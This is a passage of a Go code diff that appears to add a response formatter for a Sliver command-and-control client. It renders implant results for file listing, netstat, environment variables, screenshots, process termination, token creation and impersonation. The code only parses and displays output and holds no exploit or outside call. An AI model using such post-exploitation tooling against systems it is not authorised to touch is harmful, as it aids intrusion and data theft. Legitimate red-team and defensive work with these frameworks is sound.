+				return e
+			}
+			if resp.Path != "" {
+				return resp.Path
+			}
+		}
+
+	case "ls":
+		var resp sliverpb.Ls
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			var out strings.Builder
+			if resp.Path != "" {
+				out.WriteString(resp.Path + "\n")
+			}
+			for _, f := range resp.Files {
+				dir := "-"
+				if f.IsDir {
+					dir = "d"
+				}
+				size := ""
+				if !f.IsDir {
+					size = fmt.Sprintf("%d", f.Size)
+				}
+				out.WriteString(fmt.Sprintf("%s %-11s %9s  %s\n", dir, f.Mode, size, f.Name))
+			}
+			return out.String()
+		}
+
+	case "netstat":
+		var resp sliverpb.Netstat
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			var out strings.Builder
+			out.WriteString("PROTO  LOCAL                 REMOTE                STATE        PID    PROCESS\n")
+			for _, e := range resp.Entries {
+				local, remote := "", ""
+				if e.LocalAddr != nil {
+					local = fmt.Sprintf("%s:%d", e.LocalAddr.Ip, e.LocalAddr.Port)
+				}
+				if e.RemoteAddr != nil {
+					remote = fmt.Sprintf("%s:%d", e.RemoteAddr.Ip, e.RemoteAddr.Port)
+				}
+				var pid int32
+				var proc string
+				if e.Process != nil {
+					pid = e.Process.Pid
+					proc = e.Process.Executable
+				}
+				out.WriteString(fmt.Sprintf("%-7s%-22s%-22s%-13s%-7d%s\n",
+					e.Protocol, local, remote, e.SkState, pid, proc))
+			}
+			return out.String()
+		}
+
+	case "env":
+		var resp sliverpb.EnvInfo
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			var out strings.Builder
+			for _, v := range resp.Variables {
+				out.WriteString(fmt.Sprintf("%s=%s\n", v.Key, v.Value))
+			}
+			return out.String()
+		}
+
+	case "ifconfig":
+		var resp sliverpb.Ifconfig
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			var out strings.Builder
+			for _, ni := range resp.NetInterfaces {
+				out.WriteString(fmt.Sprintf("%s  MAC=%s  IPs=%s\n",
+					ni.Name, ni.MAC, strings.Join(ni.IPAddresses, ", ")))
+			}
+			return out.String()
+		}
+
+	case "screenshot":
+		var resp sliverpb.Screenshot
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			if len(resp.Data) > 0 {
+				return "data:image/png;base64," + base64.StdEncoding.EncodeToString(resp.Data)
+			}
+		}
+
+	case "kill", "terminate":
+		var resp sliverpb.Terminate
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			return "[+] process terminated"
+		}
+
+	case "rev2self":
+		var resp sliverpb.RevToSelf
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			return "[+] reverted to self"
+		}
+
+	case "make-token":
+		var resp sliverpb.MakeToken
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			return "[+] token created"
+		}
+
+	case "impersonate":
+		var resp sliverpb.Impersonate
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			return "[+] impersonation successful"
+		}
+
+	case "mkdir":
+		var resp sliverpb.Mkdir
+		if err := proto.Unmarshal(data, &resp); err == nil {
+			if e := checkErr(resp.Response); e != "" {
+				return e
+			}
+			return "[+] directory created: " + resp.Path
+		}
+	}
+
+	// Fallback: try Execute protobuf parse, then raw string
+	stdout, stderr := parseExecuteResponse(data)
+	if stderr != "" {
+		return stdout + "\n[stderr] " + stderr
+	}
+	if strings.TrimSpace(stdout) != "" && stdout != "(no output)" {
+		return stdout
+	}
+	return fmt.Sprintf("[debug] %d response bytes, cmdType=%s - protobuf parse failed", len(data), cmdType)
 }
